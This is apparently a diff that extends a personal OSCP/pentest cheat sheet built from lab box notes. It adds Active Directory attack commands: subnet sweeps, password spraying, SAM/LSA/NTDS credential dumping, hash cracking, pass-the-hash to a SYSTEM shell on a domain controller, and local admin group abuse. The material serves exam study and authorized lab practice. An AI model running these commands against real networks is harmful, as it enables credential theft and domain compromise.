@@ -5,7 +5,7 @@ Go through all the report.md and notes.md files and extract all of the commands 
 
 # OSCP / Pentest Cheat Sheet
 
-Extracted from all `notes.md` / `report.md` files under `boxes/htb/` and `boxes/provinggrounds/`. Commands are generalized with placeholders (`<IP>`, `<USER>`, `<DOMAIN>`, etc.) where the original notes used a hardcoded value.
+Extracted from all `notes.md` / `report.md` files under `boxes/htb/`, `boxes/provinggrounds/`, and `boxes/hackerblueprint/`. Commands are generalized with placeholders (`<IP>`, `<USER>`, `<DOMAIN>`, etc.) where the original notes used a hardcoded value.
 
 ## Table of Contents
 1. Recon / Port Scanning
@@ -57,6 +57,17 @@ Vuln-scanning NSE scripts; flagged CVE-2009-3103 (SMBv2) on a Windows 2008 R2 bo
 rustscan -a <IP> -r 1-65535 -- -sC -sV -oN rustscan.txt
 ```
 Faster full-port scan than nmap, pipes results into nmap scripts. (MonitorsFour, SecNotes)
+
+```sh
+nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt
+nmap -Pn -iL ips -sV -sC -v -oN nmap_sVsC.txt
+```
+Full-port scan across a target list file with aggressive timing, followed by a targeted `-sV -sC` pass on discovered ports — faster than scanning each host individually. (ADChain_01)
+
+```sh
+netexec smb 10.0.2.0/24
+```
+Sweep an entire subnet for live SMB hosts — one shot reveals hostnames, OS build, domain, signing status, and null-auth support for every machine on the LAN. (ADChain_01)
 
 ```sh
 dig @<IP> <domain>
@@ -806,6 +817,28 @@ sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION V
 ```
 Fix common BloodHound CE / Kali PostgreSQL collation-mismatch startup errors. (Forest, Hokkaido)
 
+```sh
+sudo apt install docker-compose docker.io
+sudo groupadd docker
+sudo usermod -aG docker $USER
+newgrp docker
+curl -L https://ghst.ly/getbhce -o docker-compose.yml
+docker-compose pull && docker-compose up -d
+docker-compose logs bloodhound | grep -i passw
+# visit http://localhost:8080/
+```
+Stand up BloodHound CE via its official docker-compose bundle; the generated admin password is printed in the container logs on first run. (ADChain_01)
+
+```sh
+netexec ldap <dc_ip> -u '<user>' -p '<pass>' --bloodhound --collection All --dns-server <dc_ip>
+```
+Collect BloodHound data straight from Kali via NetExec instead of running SharpHound on a compromised host — uploads a zip ready for BHCE ingestion. Note: if using BloodHound CE, disable legacy BH support in `~/.nxc/nxc.conf` first. (ADChain_01)
+
+```sh
+netexec ldap <dc_ip> -u '<user>' -p '<pass>' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print $5}' | tee users
+```
+Pull the full domain username list over LDAP with valid creds, stripped down to a plain wordlist for spraying. (ADChain_01)
+
 ### GPP / Credential Extraction
 ```sh
 gpp-decrypt '<cpassword value from Groups.xml>'
@@ -855,6 +888,64 @@ Check WinRM access before spending time on evil-winrm — `(Pwn3d!)` in the outp
 impacket-psexec <user>@<domain>
 ```
 PSExec-style SMB admin shell (SYSTEM) once you have local admin creds — used as the final step after cracking a Kerberoast hash for Administrator. (Active)
+
+### Password Spraying
+```sh
+netexec smb ips -u users -p pass --continue-on-success
+netexec rdp ips -u users -p pass --continue-on-success
+netexec winrm ips -u users -p pass --continue-on-success
+```
+Spray a username list against a password list across every live host (`ips`), for SMB/RDP/WinRM in turn; `--continue-on-success` keeps testing remaining user/host combos instead of stopping at the first hit. WinRM hits are the most valuable — they mean an interactive shell. (ADChain_01)
+
+### Credential Dumping — SAM / LSA / NTDS via NetExec
+```powershell
+reg save hklm\sam c:\temp\sam
+reg save hklm\system c:\temp\system
+# then, from evil-winrm:
+download sam
+download system
+```
+Manually dump the local SAM/SYSTEM registry hives by abusing `SeBackupPrivilege` (visible in `whoami /all`), then pull them back to Kali. (ADChain_01)
+
+```sh
+impacket-secretsdump -system system -sam sam local
+```
+Offline-parse a locally dumped SAM+SYSTEM pair into NT hashes without touching the network. (ADChain_01)
+
+```sh
+netexec smb ips -u '<user>' -p '<pass>' --local-auth
+```
+Auth as a local (non-domain) account recovered from a SAM dump — `--local-auth` is required or NetExec will try to authenticate it against the domain and fail. (ADChain_01)
+
+```sh
+netexec smb ips -u '<user>' -p '<pass>' --sam
+netexec smb ips -u '<user>' -p '<pass>' -M lsassy
+netexec smb ips -u '<user>' -p '<pass>' --lsa
+netexec smb ips -u '<user>' -p '<pass>' --ntds
+```
+Remote credential dumping with an admin/local-admin session — `--sam` (local SAM), `-M lsassy` (LSASS via a NetExec module), `--lsa` (LSA secrets / cached domain creds, i.e. DCC2/mscash2 hashes), `--ntds` (full domain NTDS.DIT dump from a DC — equivalent to secretsdump `-just-dc`). (ADChain_01)
+
+```sh
+haiti '$DCC2$10240#<user>#<hash>'
+```
+Identify an unknown hash format (e.g. confirms `$DCC2$...` as Domain Cached Credentials 2 / mscash2, hashcat mode 2100, JtR format `mscash2`) before picking a cracking mode. (ADChain_01)
+
+```sh
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa.txt
+```
+Crack DCC2/mscash2 cached-credential hashes pulled via `--lsa` — John auto-detects the `$DCC2$` format. (ADChain_01)
+
+### Pass-the-Hash
+```sh
+netexec smb <dc_ip> -u administrator -H '<ntlm_hash>'
+netexec smb <dc_ip> -u administrator -H '<ntlm_hash>' -X whoami
+```
+Authenticate with a raw NTLM hash (no cracking needed) once an NTDS/SAM dump yields the Administrator hash; `-X` runs a command remotely to confirm code exec. (ADChain_01)
+
+```sh
+impacket-psexec <domain>/administrator@<dc_ip> -hashes :<ntlm_hash>
+```
+Pass-the-hash PSExec — full SYSTEM shell on the DC using only the NTLM hash, no plaintext password required. (ADChain_01)
 
 ### Privilege / ACL Abuse
 ```sh
@@ -965,6 +1056,11 @@ john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt --show
 General-purpose John cracking — used against a Kerberoast hash, an `.htpasswd` (APR1-MD5), and a PDF hash. (Access, AuthBy)
 
 ```sh
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+Crack local SAM NT hashes recovered via `SeBackupPrivilege` reg-save + `secretsdump -sam -system local`. (ADChain_01)
+
+```sh
 pdf2john Infrastructure.pdf > Infrastructure.hash
 john Infrastructure.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
@@ -1015,4 +1111,9 @@ Attempted to abuse local `WSUS Administrators` group membership via SharpWSUS to
 xfreerdp /cert:ignore /u:'<user>' /p:'<pass>' /v:<host> +clipboard
 ```
 RDP back in as a newly-created/escalated user to collect further loot or pivot further (clipboard sharing enabled for easy file/text transfer). (Hokkaido, Nickel)
+
+```cmd
+net localgroup "administrators" <domain_user> /add
+```
+Once RDP'd in as a local admin (e.g. via a cracked local-account password), add your existing domain account to the local Administrators group — instantly gives that domain account admin-equivalent SMB/WinRM access to the box for further dumping. (ADChain_01)
 
